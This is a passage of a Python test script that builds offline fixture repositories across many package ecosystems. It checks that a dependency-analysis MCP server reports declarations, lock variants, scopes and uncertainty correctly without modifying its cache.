"""Exercise real MCP contracts used by the skill; this does not grade agent prose.

Run with a depcheck[agent] environment from the repository root:
    python skills/check-dependencies/evals/run_live.py --output .tmp/depcheck-live.json
All fixtures are temporary, and every scan is offline.
"""

import argparse
import asyncio
import json
import sys
from pathlib import Path
from tempfile import TemporaryDirectory

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client


def check(condition: bool, message: str) -> None:
    if not condition:
        raise RuntimeError(message)


def _prepare_fixtures(root: Path) -> dict[str, dict[str, str]]:
    fixtures = {
        "python": {
            "requirements.txt": "requests==2.31.0\n",
            "app.py": "import requests\n",
        },
        "python-unknown-marker": {
            ".depcheck.toml": 'python-version="3.12"\n',
            "requirements.txt": 'demo==1; "gui" in extras\n',
            "app.py": "import demo\n",
        },
        "unicode-columns": {
            "requirements.txt": "PyYAML==6.0.2\n",
            "app.py": '标签="雪😀"; import yaml\n',
            "book.ipynb": json.dumps(
                {
                    "cells": [
                        {"cell_type": "code", "source": '标签="雪😀"; import yaml\n'}
                    ]
                }
            ),
        },
        "python-groups": {
            "pyproject.toml": '[project]\nname="demo"\nversion="1"\n[dependency-groups]\nBase_Test=["pyyaml==6.0.2"]\nci=[{include-group="base.test"},{include-group="BASE-TEST"}]\n',
            "test_app.py": "import yaml\n",
        },
        "python-uv-legacy": {
            "pyproject.toml": '[project]\nname="demo"\nversion="1"\n[tool.uv]\ndev-dependencies=["pyyaml==6.0.2"]\n[dependency-groups]\nDEV=["pytest==8.3.0"]\nci=[{include-group="dev"},{include-group="DEV"}]\n',
            "test_app.py": "import yaml\n",
        },
        "python-uv-forks": {
            "pyproject.toml": '[project]\nname="demo"\nversion="1"\ndependencies=["requests>=2"]\n',
            "uv.lock": 'version=1\nrequires-python=">=3.9"\nresolution-markers=["sys_platform == \'win32\'", "sys_platform != \'win32\'"]\n[[package]]\nname="requests"\nversion="2.31.0"\nsource={registry="https://pypi.org/simple"}\nresolution-markers=["sys_platform == \'win32\'"]\n[[package]]\nname="requests"\nversion="2.32.0"\nsource={registry="https://pypi.org/simple"}\nresolution-markers=["sys_platform != \'win32\'"]\n',
            "app.py": "import requests\n",
        },
        "cmake-package-config": {
            "CMakeLists.txt": "project(demo)\nfind_package(absl)\n",
            "ExportConfig.cmake.in": "@PACKAGE_INIT@\ninclude(CMakeFindDependencyMacro)\nif(@HAS_THREADS@)\n  find_dependency(Threads)\nendif()\nfind_dependency(absl @VERSION@ CONFIG)\n",
        },
        "bazel-module": {
            "MODULE.bazel": 'module(name="demo")\nbazel_dep(name="abseil-cpp",version="20260526.0",repo_name="absl")\nbazel_dep(name="rules_python",version="2.2.0",dev_dependency=True)\nlocal_path_override(module_name="abseil-cpp",path="../private")\n',
        },
        "python-group-selection": {
            "pyproject.toml": '[project]\nname="demo"\nversion="1"\n[dependency-groups]\nleft=["pyyaml==6.0.1"]\nright=["pyyaml==6.0.2"]\n[tool.uv]\nconflicts=[[{group="left"},{group="right"}]]\n',
            "test_app.py": "import yaml\n",
        },
        "cpp-preprocessor": {
            "conanfile.txt": "[test_requires]\ngtest/1.17.0\n",
            "main.cc": "/*\n#include <fmt/comment.h>\n*/\n#if ENABLE_TESTS\n  #include <gtest/gtest.h>\n#endif\n#include HEADER\n",
        },
        "gradle-catalog": {
            "gradle/libs.versions.toml": '[versions]\nshared="1.4"\n[libraries]\ncore-lib={module="example:core",version.ref="shared"}\n[bundles]\nmain=["core-lib"]\n[plugins]\ncompile={id="example.compile",version="2"}\n',
            "build.gradle.kts": "dependencies { implementation(libs.core.lib) }\n",
        },
        "yarn-inventory": {
            "yarn.lock": '__metadata: {version: 10}\n"tool@npm:^1, tool@npm:~1": {version: 1.0.0-alpha.1, resolution: "tool@npm:1.0.0-alpha.1", conditions: os=linux}\n"local@workspace:*": {version: 0.0.0-use.local, resolution: "local@workspace:packages/local"}\n',
        },
        "pipenv-private": {
            "Pipfile": '[[source]]\nname="private"\nurl="https://private.example/simple"\nverify_ssl=true\n\n[packages]\nrequests={version="==2.31.0",index="private"}\n',
            "app.py": "import requests\n",
        },
        "pipenv-categories": {
            "Pipfile": '[packages]\nrequests="*"\n[deploy]\nrequests="==2.31.0"\n',
            "Pipfile.lock": json.dumps(
                {
                    "default": {
                        "requests": {
                            "version": "==2.31.0",
                            "markers": "sys_platform == 'win32'",
                        }
                    },
                    "deploy": {
                        "requests": {"version": "==2.31.0", "extras": ["socks"]}
                    },
                }
            ),
            "app.py": "import requests\n",
        },
        "conan-contexts": {
            "conanfile.txt": "[requires]\nfmt/[>=1.0 <3.0]\n",
            "conan.lock": '{\n "version":"0.5",\n "requires":[\n  "fmt/2.0#one%123",\n  "fmt/1.0#two%124"\n ],\n "build_requires":["fmt/2.0#one%123"],\n "python_requires":["recipe/1.0#three"]\n}\n',
            "main.cpp": "#include <fmt/core.h>\n",
        },
        "maven-plugin": {
            "pom.xml": "<project>\n<groupId>example</groupId><artifactId>app</artifactId><version>1</version>\n<build><pluginManagement><plugins>\n<plugin><artifactId>maven-compiler-plugin</artifactId><version>3.13.0</version></plugin>\n</plugins></pluginManagement><plugins>\n<plugin><artifactId>maven-compiler-plugin</artifactId><executions><execution><id>compile-it</id><phase>compile</phase><goals><goal>compile</goal></goals></execution></executions></plugin>\n</plugins></build></project>\n",
        },
        "go-checksum": {
            "go.mod": "module example.com/app\n\nrequire example.com/dep v1.0.0\n",
            "go.sum": "example.com/dep v1.0.0/go.mod h1:"
            + "A" * 43
            + "=\n"
            + "example.com/dep v1.4.0 h1:"
            + "A" * 43
            + "=\n"
            + "example.com/old v0.9.0 h1:"
            + "A" * 43
            + "=\n",
            "main.go": 'package main\nimport "example.com/dep"\n',
        },
        "go-tools": {
            "go.mod": "module example.com/app\ngo 1.24.0\nrequire example.com/tool v1.0.0 // indirect\ntool (\n\texample.com/tool/cmd/lint\n\texample.com/tool/cmd/lint\n)\n",
        },
        "gradle-variants": {
            "build.gradle.kts": 'val docs = """\nimplementation("ghost:docs:9.0")\n"""\ndependencies {\n implementation(\n  "org.slf4j:slf4j-api:latest.release"\n )\n}\n',
            "gradle.lockfile": "org.slf4j:slf4j-api:1.7.36=compileClasspath\norg.slf4j:slf4j-api:2.0.16=testRuntimeClasspath\n",
        },
        "vcpkg-registry": {
            "vcpkg.json": '{\n "dependencies":[{"name":"fmt","platform":"windows","version>=":"10.0","features":[{"name":"unicode","platform":"linux"}]}],\n "default-features":[{"name":"tests","platform":"windows"}],\n "features":{"tests":{"description":"Tests","dependencies":["gtest"]},"debugging":{"description":"Debugging","supports":"linux","dependencies":["gtest"]}}\n}\n',
            "vcpkg-lock.json": '{"https://example.test/registry":{"HEAD":"abc"}}',
            "main.cpp": "#include <fmt/core.h>\n",
        },
        "preview": {
            "pyproject.toml": '[project]\nname="app"\nversion="1"\n'
            'dependencies=["requests==2.31.0"]\n'
        },
        "preview-ambiguous": {
            "pyproject.toml": '[project]\ndependencies=["requests==1"]\n[project.optional-dependencies]\ntest=["requests==1"]\n'
        },
        "preview-url": {
            "pyproject.toml": '[project]\ndependencies=["requests @ https://example.org/r.whl"]\n'
        },
        "npm": {
            "package.json": '{"dependencies":{"lodash":"^4.17.0"}}',
            "app.js": "import lodash from 'lodash';\n",
        },
        "lock-ambiguous": {
            "package.json": '{"dependencies":{"tool":"^1.0.0"}}',
            "app.js": 'import "tool";\n',
            "package-lock.json": '{"packages":{"node_modules/tool":{"version":"1.0.0"}}}',
            "yarn.lock": "# yarn lock\n",
        },
        "frontend": {
            "package.json": '{"dependencies":{"font":"1.0.0","theme":"1.0.0","other":"1.0.0"},"devDependencies":{"vite":"6.0.0"}}',
            "vite.config.js": 'import {defineConfig} from "vite";\nexport default defineConfig({});\n',
            "Page.astro": '---\nimport "font/style.css";\n---\n<div>Hello</div>\n',
            "global.css": '@import url("theme/base.css");\n',
        },
        "frontend-uncertain": {
            "package.json": '{"devDependencies":{"theme":"1.0.0"}}',
            "global.css": '@import "theme/base.css";\n',
        },
        "origins": {
            "package.json": '{"dependencies":{"parent":"1.0.0"}}',
            "package-lock.json": '{"lockfileVersion":3,"packages":{"":{"dependencies":{"parent":"1.0.0"}},"node_modules/parent":{"version":"1.0.0","dependencies":{"child":"2.0.0"}},"node_modules/child":{"version":"2.0.0"}}}',
        },
        "component-regions": {
            "package.json": '{"dependencies":{"known":"1.0.0"}}',
            "Page.vue": '<script lang="ts">import "known";</script><template>{{ value }}</template>',
            "Page.svelte": '<script>import "known";</script><div>{value}</div>',
        },
        "uv-workspace": {
            "pyproject.toml": '[tool.uv.workspace]\nmembers=["member","override"]\n[tool.uv.sources]\nrequests={git="https://example.invalid/root"}\n',
            "member/pyproject.toml": '[project]\nname="member"\nversion="1"\ndependencies=["requests==2.31.0"]\n',
            "member/app.py": "import requests\n",
            "override/pyproject.toml": '[project]\nname="override"\nversion="1"\ndependencies=["requests==2.31.0"]\n[tool.uv.sources]\nrequests={path="../own",marker="sys_platform == \'unselected-platform\'"}\n',
        },
        "python-bindings": {
            "pyproject.toml": '[project]\nname="app"\nversion="1"\ndependencies=["foo<2","bar<2"]\n',
            "uv.lock": 'version=1\n[[package]]\nname="foo"\nversion="1.0.0"\nsource={registry="https://pypi.org/simple"}\n'
            '[[package]]\nname="foo"\nversion="3.0.0"\nsource={registry="https://pypi.org/simple"}\n'
            '[[package]]\nname="foo"\nversion="1.0.0"\nsource={git="https://example.invalid/foo"}\n'
            '[[package]]\nname="bar"\nversion="3.0.0"\nsource={registry="https://pypi.org/simple"}\n',
        },
        "uv-source-profile": {
            "pyproject.toml": '[project]\nname="app"\nversion="1"\ndependencies=["requests==2.31.0"]\n[tool.uv]\nsources=[]\n',
        },
        "pylock-coverage": {
            "pyproject.toml": '[project]\nname="app"\nversion="1"\ndependencies=["requests==2.31.0"]\n',
            "app.py": "import requests\n",
            "pylock.ci.toml": 'lock-version="1.0"\ncreated-by="example"\npackages=[]\n',
        },
        "pylock-inventory": {
            "pylock.toml": 'lock-version="1.0"\ncreated-by="controlled"\nenvironments=["sys_platform == \'win32\'"]\n'
            '[[packages]]\nname="requests"\nversion="2.31.0"\nindex="https://pypi.org/simple"\n'
            'dependencies=[{name="child"}]\nwheels=[{url="https://files.pythonhosted.org/requests-2.31.0-py3-none-any.whl",hashes={sha256="00"}}]\n'
            '[[packages]]\nname="child"\ndirectory={path="../not-opened",editable=true}\n',
        },
        "uv-index-policy": {
            "pyproject.toml": '[tool.uv.workspace]\nmembers=["member"]\n[tool.uv]\nindex-url="https://ignored.invalid/simple"\n',
            "uv.toml": 'extra-index-url=["https://private.invalid/simple"]\n',
            "member/pyproject.toml": '[project]\nname="member"\nversion="1"\ndependencies=["requests==2.31.0"]\n',
            "member/uv.toml": 'index-url="https://pypi.org/simple"\n',
        },
        "evidence-pages": {
            "package.json": '{"dependencies":{"lib":"1.0.0"}}',
            "app.js": 'import "lib";\n' * 65,
        },
        "python-source": {
            "pyproject.toml": '[project]\nname="app"\nversion="1"\ndependencies=["requests==2.31.0"]\n',
            "uv.lock": 'version=1\n[[package]]\nname="requests"\nversion="2.31.0"\nsource={editable="vendor/requests"}\n',
        },
        "pages": {
            "requirements.txt": "".join(f"package-{i:03d}==1.0\n" for i in range(65))
        },
        "ambiguous": {
            "one/package.json": '{"dependencies":{"shared":"1.0"}}',
            "two/package.json": '{"dependencies":{"shared":"2.0"}}',
        },
        "dynamic": {
            "requirements.txt": "requests==2.31.0\n",
            "app.py": "import importlib\nimportlib.import_module(name)\n",
        },
        "alias": {
            "package.json": '{"dependencies":{"lodash":"4.17.21"}}',
            "app.js": "import lodash from '#lodash';\n",
        },
        "alias-known": {
            "package.json": '{"dependencies":{"lodash":"4.17.21","other":"1.0.0"},"imports":{"#alias":"lodash/fp"}}',
            "app.js": "import a from '#alias';\n",
        },
        "tool": {
            "requirements.txt": "ruff==0.11.0\n",
            ".depcheck.toml": '[[tool-usage]]\necosystem="PyPI"\n'
            'project-id="pypi:python:."\npackage="ruff"\nscope="test"\nreason="CI lint"\n',
        },
        "command": {
            "package.json": '{"devDependencies":{"vitest":"1.0.0"},"scripts":{"test":"vitest run"}}',
        },
        "python-tasks": {
            "pyproject.toml": '[project]\nname="task-app"\nversion="1"\ndependencies=["ruff==0.11.0"]\n[tool.hatch.envs.lint]\ndetached=true\ndependencies=["ruff==0.12.0"]\n[tool.hatch.envs.lint.scripts]\ncheck="ruff check ."\n',
        },
        "cargo": {
            "Cargo.toml": '[package]\nname="demo"\nversion="0.1.0"\n[dependencies]\nfoo="1"\n',
            "Cargo.lock": 'version=4\n[[package]]\nname="foo"\nversion="1.2.3"\nsource="registry+https://github.com/rust-lang/crates.io-index"\n',
            "src/lib.rs": 'use foo::Thing;\nconst DOC: &str = "foo::example";\n',
        },
        "cargo-legacy": {
            "Cargo.toml": '[package]\nname="demo"\nversion="0.1.0"\nedition="2021"\n'
            '[dev-dependencies]\nfoo="1"\n[dev_dependencies]\nfoo="2"\n'
            '[target."cfg(unix)".build_dependencies]\ncc="1"\n',
            "new/Cargo.toml": '[package]\nname="new"\nversion="0.1.0"\nedition="2024"\n'
            '[dev_dependencies]\nbar="1"\n',
        },
        "cargo-workspace-patch": {
            "Cargo.toml": '[workspace]\nmembers=["member"]\n[patch.crates-io]\n'
            'foo={git="https://example.invalid/patched-foo"}\n'
            'baz={git="https://example.invalid/patched-baz"}\n'
            '[patch."https://example.invalid/unrelated"]\n'
            'bar={git="https://example.invalid/patched-bar"}\n',
            "member/Cargo.toml": '[package]\nname="member"\nversion="0.1.0"\nedition="2021"\n'
            '[dependencies]\nfoo="=1.0.0"\nbar="=1.0.0"\nbaz="=1.0.0"\n',
            "Cargo.lock": 'version=4\n[[package]]\nname="foo"\nversion="1.0.0"\n'
            'source="git+https://example.invalid/patched-foo#abcd"\n'
            '[[package]]\nname="bar"\nversion="2.0.0"\n'
            'source="registry+https://github.com/rust-lang/crates.io-index"\n'
            '[[package]]\nname="baz"\nversion="2.0.0"\n'
            'source="git+https://example.invalid/patched-baz#ef01"\n',
            "member/src/lib.rs": "use foo::Thing;\n",
        },
        "toml-locations": {
            "Cargo.toml": '[workspace]\nmembers=["member"]\n[workspace.dependencies]\nfoo="1"\nbar="1"\n',
            "member/Cargo.toml": '[package]\nname="member"\nversion="0.1.0"\nedition="2021"\n[dependencies]\nfoo.workspace=true\nbar.workspace=true\n',
            "Cargo.lock": 'version=4\n[[package]]\nname="foo"\nversion="1.0.0"\nsource="registry+https://github.com/rust-lang/crates.io-index"\n[[package]]\nname="bar"\nversion="1.0.0"\nsource="registry+https://github.com/rust-lang/crates.io-index"\n',
        },
        "cmake": {
            "CMakeLists.txt": "include(FetchContent)\n",
            "deps.cmake": "FetchContent_Declare(GoogleTest URL https://example.test/source.zip)\nFetchContent_MakeAvailable(googletest)\n",
        },
        "cmake-script": {
            "fetch.cmake": 'FetchContent_Declare(Shared URL https://example.test/source.zip)\nCPMAddPackage("gh:fmtlib/fmt#11.0.0")\n',
            "app/CMakeLists.txt": "find_package(Shared CONFIG REQUIRED)\n",
        },
        "uncovered": {"composer.json": '{"require":{"vendor/package":"1"}}'},
        "components": {
            "a/pyproject.toml": '[project]\ndependencies=["PyYAML==6.0.2"]\n',
            "a/app.py": "import sklearn\n",
            "b/pyproject.toml": '[project]\ndependencies=["scikit-learn==1.5.0"]\n',
            "b/app.py": "import yaml\n",
        },
        "configuration": {
            "package.json": '{"devDependencies":{"@types/node":"22.0.0"}}',
            "tsconfig.json": '{"compilerOptions":{"types":["node"]}}',
            "main.ts": "console.log(process.version);\n",
        },
        "named-components": {
            "a/pyproject.toml": '[project]\nname="a"\nversion="1.0"\ndependencies=["PyYAML==6.0.2"]\n',
            "a/main.py": "import yaml\n",
            "b/pyproject.toml": '[project]\nname="b"\nversion="1.0"\ndependencies=["PyYAML==6.0.2"]\n',
            "b/main.py": "import yaml\n",
        },
    }
    for folder, files in fixtures.items():
        for name, content in files.items():
            path = root / folder / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content, encoding="utf-8")
    return fixtures


async def _check_manifest_assertions(root, call, passed):
    scan = await call("scan_repository", "python")
    check(not scan["summary"]["complete"], "Offline summary must stay incomplete")
    check(scan["capabilities"]["security"]["state"] == "skipped", "Security ran")
    check(
        scan["capabilities"]["dependency_hygiene"]["state"] == "complete",
        "Hygiene incomplete",
    )
    check(
        scan["context"]["complete"] and not scan["context"]["stale"],
        "Stale index",
    )
    passed.append("offline-freshness-vs-security")

    marker_scan = await call("scan_repository", "python-unknown-marker")
    marker_cache = root / "python-unknown-marker/.depcheck/index.sqlite3"
    marker_before = marker_cache.read_bytes(), marker_cache.stat().st_mtime_ns
    marker_query = await call(
        "explain_dependency",
        "python-unknown-marker",
        package="demo",
        ecosystem="PyPI",
        project_id="pypi:python:.",
    )
    check(
        any(
            d["code"] == "manifest.marker-evaluation-unknown"
            for d in marker_scan["diagnostics"]
        )
        and marker_scan["capabilities"]["dependency_hygiene"]["state"] == "incomplete"
        and len(marker_query["declarations"]) == 1
        and marker_query["declarations"][0]["marker"] == '"gui" in extras'
        and not marker_query["evidence_complete"]
        and not marker_query["findings"]
        and marker_before
        == (marker_cache.read_bytes(), marker_cache.stat().st_mtime_ns),
        "Unknown Python marker lost its declaration or uncertainty, or changed the query cache",
    )
    passed.append("unknown-python-marker-survives-read-only-index-query")

    await call("scan_repository", "unicode-columns")
    unicode_cache = root / "unicode-columns/.depcheck/index.sqlite3"
    unicode_before = (
        unicode_cache.read_bytes(),
        unicode_cache.stat().st_mtime_ns,
    )
    unicode_usage = await call(
        "explain_dependency",
        "unicode-columns",
        package="pyyaml",
        ecosystem="PyPI",
        project_id="pypi:python:.",
    )
    check(
        len(unicode_usage["usages"]) == 2
        and {u["location"]["path"] for u in unicode_usage["usages"]}
        == {"app.py", "book.ipynb"}
        and all(
            u["location"]["line"] == 1 and u["location"]["column"] == 10
            for u in unicode_usage["usages"]
        )
        and unicode_before
        == (unicode_cache.read_bytes(), unicode_cache.stat().st_mtime_ns),
        "Unicode Python columns changed units or cached queries modified the index",
    )
    passed.append("unicode-columns-across-python-and-notebook-sources")

    await call("scan_repository", "python-groups")
    groups = await call(
        "explain_dependency",
        "python-groups",
        package="pyyaml",
        ecosystem="PyPI",
        project_id="pypi:python:.",
    )
    groups_impact = await call(
        "dependency_impact",
        "python-groups",
        package="pyyaml",
        ecosystem="PyPI",
        project_id="pypi:python:.",
    )
    check(
        len(groups["declarations"]) == 3
        and [d["metadata"]["group"] for d in groups["declarations"]].count("dev:ci")
        == 2
        and all(d["location"]["line"] == 5 for d in groups["declarations"])
        and not any(f["code"] == "declaration.duplicate" for f in groups["findings"]),
        "PEP735 include normalization, multiplicity or physical source identity was lost",
    )
    check(
        groups["evidence_page"]["counts"]["declarations"] == 3
        and groups_impact["usage_count"] == 1,
        "PEP735 indexing or impact lost repeated declarations and source use",
    )
    passed.append("pep735-normalized-includes-retain-multiplicity")

    await call("scan_repository", "python-uv-legacy")
    legacy = await call(
        "explain_dependency",
        "python-uv-legacy",
        package="pyyaml",
        ecosystem="PyPI",
        project_id="pypi:python:.",
    )
    modern = await call(
        "explain_dependency",
        "python-uv-legacy",
        package="pytest",
        ecosystem="PyPI",
        project_id="pypi:python:.",
    )
    check(
        len(legacy["declarations"]) == 1
        and legacy["declarations"][0]["metadata"]["group"] == "dev:DEV"
        and legacy["declarations"][0]["location"]["line"] == 5
        and legacy["declarations"][0]["scope"] == "development"
        and not legacy["findings"],
        "Legacy uv declarations were lost, copied into includes or assigned runtime scope",
    )
    check(
        [d["metadata"]["group"] for d in modern["declarations"]]
        == ["dev:DEV", "dev:ci", "dev:ci"]
        and all(d["location"]["line"] == 7 for d in modern["declarations"]),
        "Standard includes lost their counts or original locations when uv legacy dev was appended",
    )
    passed.append("uv-legacy-dev-appended-after-standard-includes")

    template_scan = await call("scan_repository", "cmake-package-config")
    exported = await call(
        "explain_dependency",
        "cmake-package-config",
        package="absl",
        ecosystem="CMake",
        project_id="cmake:cmake:.",
    )
    threads = await call(
        "explain_dependency",
        "cmake-package-config",
        package="Threads",
        ecosystem="CMake",
        project_id="cmake:cmake:.",
    )
    check(
        len(exported["declarations"]) == 2
        and exported["resolved_version"] is None
        and not exported["evidence_complete"]
        and threads["declarations"][0]["location"]["line"] == 4,
        "CMake package-config assertions became installed versions or lost locations",
    )
    template_declaration = next(
        d for d in exported["declarations"] if d["metadata"].get("template")
    )
    check(
        template_declaration["metadata"]["mechanism"] == "find_dependency"
        and template_declaration["metadata"]["dynamic_arguments"] == [0]
        and template_declaration["metadata"]["activation"] == "unknown"
        and template_declaration["location"]["path"] == "ExportConfig.cmake.in"
        and any(
            d["code"] == "manifest.unsupported-cmake-template-expansion"
            for d in template_scan["diagnostics"]
        ),
        "Template substitutions lost their qualification or declaration provenance",
    )
    passed.append("cmake-package-config-literals-retain-template-uncertainty")

    bazel_scan = await call("scan_repository", "bazel-module")
    bazel_project = next(
        p for p in bazel_scan["projects"] if p["project_id"] == "bazel:bzlmod:."
    )
    bazel_context = next(
        p
        for p in bazel_scan["context"]["projects"]
        if p["project_id"] == "bazel:bzlmod:."
    )
    for name, capability in bazel_project["capabilities"].items():
        indexed = bazel_context["capabilities"][name]
        check(
            indexed["state"] == capability["state"]
            and indexed["reason"] == capability.get("reason")
            and indexed["complete"] == (capability["state"] == "complete"),
            "Indexed project capability lost scan state or reason",
        )
    check(
        bazel_context["capabilities"]["usage"]["state"] == "unsupported",
        "Unsupported Bazel usage lost its state in MCP context",
    )
    bazel = await call(
        "explain_dependency",
        "bazel-module",
        package="abseil-cpp",
        ecosystem="Bazel",
        project_id="bazel:bzlmod:.",
    )
    bazel_dev = await call(
        "explain_dependency",
        "bazel-module",
        package="rules_python",
        ecosystem="Bazel",
        project_id="bazel:bzlmod:.",
    )
    bazel_impact = await call(
        "dependency_impact",
        "bazel-module",
        package="abseil-cpp",
        ecosystem="Bazel",
        project_id="bazel:bzlmod:.",
    )
    check(
        bazel_scan["inventory"]["declaration_count"] == 2
        and bazel["resolved_versions"] == []
        and bazel["purl"] is None
        and not bazel["evidence_complete"]
        and bazel["declarations"][0]["metadata"]["arguments"]["repo_name"] == "absl"
        and bazel["declarations"][0]["location"]["line"] == 2,
        "Bzlmod declaration identity/alias/position lost or request became selected version",
    )
    check(
        bazel_dev["declarations"][0]["scope"] == "development"
        and bazel_dev["declarations"][0]["kind"] == "conditional"
        and bazel_dev["declarations"][0]["metadata"]["activation"] == "unknown"
        and bazel_impact["usage_count"] == 0
        and not bazel_impact["evidence_complete"]
        and any(
            d["code"] == "manifest.bazel-uncollected" for d in bazel_scan["diagnostics"]
        ),
        "Bzlmod dev/override conditions became active usage or removal evidence",
    )
    passed.append("bzlmod-requests-and-dev-conditions-are-not-installed-state")

    selection_scan = await call("scan_repository", "python-group-selection")
    selection = await call(
        "explain_dependency",
        "python-group-selection",
        package="pyyaml",
        ecosystem="PyPI",
        project_id="pypi:python:.",
    )
    selection_impact = await call(
        "dependency_impact",
        "python-group-selection",
        package="pyyaml",
        ecosystem="PyPI",
        project_id="pypi:python:.",
    )
    check(
        any(
            d["code"] == "analysis.python-group-selection-unknown"
            for d in selection_scan["diagnostics"]
        )
        and not any(
            f["code"] == "declaration.conflict" for f in selection_scan["findings"]
        ),
        "Independent Python development groups became a definite active conflict",
    )
    check(
        not selection["evidence_complete"]
        and selection["usage_complete"]
        and not selection["findings"]
        and not selection_impact["evidence_complete"],
        "Analysis-stage uncertainty disappeared from cached dependency queries",
    )
    passed.append("python-group-selection-uncertainty-survives-indexing")
    return scan


async def _check_go_gradle_and_yarn(root, call, passed):
    go_scan = await call("scan_repository", "go-checksum")
    go_dep = await call(
        "explain_dependency",
        "go-checksum",
        package="example.com/dep",
        ecosystem="Go",
    )
    go_old = await call(
        "dependency_impact",
        "go-checksum",
        package="example.com/old",
        ecosystem="Go",
    )
    check(
        go_scan["capabilities"]["dependency_hygiene"]["state"] == "incomplete"
        and go_dep["resolved_versions"] == []
        and not go_dep["evidence_complete"]
        and len(go_dep["declarations"]) == 3,
        "Go minimum/checksum assertions became selected versions",
    )
    check(
        [d["kind"] for d in go_dep["declarations"]]
        == ["direct", "checksum", "checksum"]
        and go_dep["declarations"][0]["constraint"]["scheme"] == "go-minimum"
        and go_dep["declarations"][1]["metadata"]["checksum_kind"] == "go.mod"
        and go_dep["declarations"][2]["metadata"]["integrity_verified"] is False
        and go_old["usage_count"] == 0
        and not go_old["evidence_complete"],
        "Go artifact context or removal uncertainty was lost",
    )
    passed.append("go-checksums-do-not-select-build-versions")

    go_snapshots = root / "go-checksum/.tmp"
    go_snapshots.mkdir(exist_ok=True)
    (go_snapshots / "before.json").write_text(json.dumps(go_scan))
    go_sum = root / "go-checksum/go.sum"
    go_sum.write_text(
        go_sum.read_text().replace(
            "v1.4.0 h1:" + "A" * 43 + "=", "v1.4.0 h1:" + "B" * 42 + "A="
        )
    )
    go_after = await call("scan_repository", "go-checksum")
    (go_snapshots / "after.json").write_text(json.dumps(go_after))
    go_cache = root / "go-checksum/.depcheck/index.sqlite3"
    go_cache_before = (go_cache.read_bytes(), go_cache.stat().st_mtime_ns)
    go_comparison = await call(
        "compare_dependency_snapshots",
        "go-checksum",
        before_file=".tmp/before.json",
        after_file=".tmp/after.json",
    )
    check(
        go_comparison["comparable"]
        and go_comparison["counts"]["declarations_added"] == 1
        and go_comparison["counts"]["declarations_removed"] == 1
        and not go_comparison["remediation_verified"]
        and go_comparison["changes"]["declarations_added"][0]["metadata"][
            "integrity_verified"
        ]
        is False
        and go_cache_before == (go_cache.read_bytes(), go_cache.stat().st_mtime_ns),
        "Checksum-only change was hidden, verified or mutated the cache",
    )
    passed.append("checksum-only-snapshot-change-preserves-uncertainty")

    go_tools_scan = await call("scan_repository", "go-tools")
    go_tool = await call(
        "explain_dependency",
        "go-tools",
        package="example.com/tool",
        ecosystem="Go",
    )
    go_tool_impact = await call(
        "dependency_impact",
        "go-tools",
        package="example.com/tool",
        ecosystem="Go",
    )
    check(
        go_tools_scan["inventory"]["usage_count"] == 2
        and go_tool["resolved_versions"] == []
        and go_tool["imports"] == []
        and go_tool["findings"] == []
        and go_tool["declarations"][0]["metadata"]["indirect"] is True
        and not go_tool["evidence_complete"],
        "Go tool configuration became source imports, missing dependency or selected versions",
    )
    check(
        [u["location"]["line"] for u in go_tool["usages"]] == [5, 6]
        and all(
            u["kind"] == "configuration" and u["scope"] == "build"
            for u in go_tool["usages"]
        )
        and go_tool_impact["files"] == ["go.mod"]
        and go_tool_impact["usage_count"] == 2,
        "Go tool context, repeats or declaration positions were lost",
    )
    passed.append("go-tool-configuration-is-not-execution")

    gradle_scan = await call("scan_repository", "gradle-variants")
    gradle = await call(
        "explain_dependency",
        "gradle-variants",
        package="org.slf4j:slf4j-api",
        ecosystem="Maven",
        project_id="maven:gradle:.",
    )
    gradle_impact = await call(
        "dependency_impact",
        "gradle-variants",
        package="org.slf4j:slf4j-api",
        ecosystem="Maven",
        project_id="maven:gradle:.",
    )
    check(
        gradle_scan["inventory"]["declaration_count"] == 1
        and gradle["resolved_versions"] == ["1.7.36", "2.0.16"]
        and gradle["resolved_version"] is None
        and not gradle["evidence_complete"]
        and gradle["declarations"][0]["kind"] == "conditional",
        "Gradle comments/requests became active versions or lock variants collapsed",
    )
    check(
        len(gradle["resolutions"]) == 2
        and {tuple(r["origin"]["configurations"]) for r in gradle["resolutions"]}
        == {("compileClasspath",), ("testRuntimeClasspath",)}
        and len({r["instance"] for r in gradle["resolutions"]}) == 2
        and gradle_impact["usage_count"] == 0
        and not gradle_impact["evidence_complete"],
        "Gradle variant provenance or removal uncertainty was lost",
    )
    passed.append("gradle-literal-and-lock-variants-are-qualified")

    await call("scan_repository", "gradle-catalog")
    catalog_query = await call(
        "query_dependencies",
        "gradle-catalog",
        query="core-lib",
        ecosystem="Maven",
        project_id="maven:gradle-catalog:gradle",
    )
    catalog = await call(
        "explain_dependency",
        "gradle-catalog",
        package="example:core",
        ecosystem="Maven",
        project_id="maven:gradle-catalog:gradle",
    )
    catalog_impact = await call(
        "dependency_impact",
        "gradle-catalog",
        package="example:core",
        ecosystem="Maven",
        project_id="maven:gradle-catalog:gradle",
    )
    definition = catalog["declarations"][0]
    check(
        catalog_query["count"] == 1
        and definition["kind"] == "conditional"
        and definition["scope"] == "unknown"
        and definition["location"]["line"] == 4
        and definition["metadata"]["version_source"]["line"] == 2
        and definition["metadata"]["bundles"][0]["alias"] == "main",
        "Catalog alias search, provenance or bundle membership was lost",
    )
    check(
        catalog["resolved_versions"] == []
        and not catalog["usages"]
        and not catalog["findings"]
        and not catalog["usage_complete"]
        and not catalog["evidence_complete"]
        and catalog_impact["usage_count"] == 0
        and not catalog_impact["evidence_complete"],
        "Catalog definitions became active/selected packages or justified removal",
    )
    passed.append("gradle-catalog-definition-binding-is-unknown")

    await call("scan_repository", "yarn-inventory")
    yarn_cache = root / "yarn-inventory/.depcheck/index.sqlite3"
    yarn_before = yarn_cache.read_bytes(), yarn_cache.stat().st_mtime_ns
    yarn_query = await call(
        "query_dependencies",
        "yarn-inventory",
        project_id="npm:yarn-lock:.",
    )
    yarn = await call(
        "explain_dependency",
        "yarn-inventory",
        package="tool",
        ecosystem="npm",
        project_id="npm:yarn-lock:.",
    )
    yarn_impact = await call(
        "dependency_impact",
        "yarn-inventory",
        package="tool",
        ecosystem="npm",
        project_id="npm:yarn-lock:.",
    )
    check(
        yarn_query["count"] == 2
        and len(yarn["declarations"]) == 2
        and yarn["declarations"][0]["location"]["line"] == 2
        and all(
            d["kind"] == "conditional" and d["scope"] == "unknown"
            for d in yarn["declarations"]
        )
        and yarn["declarations"][0]["metadata"]["context"]["conditions"] == "os=linux",
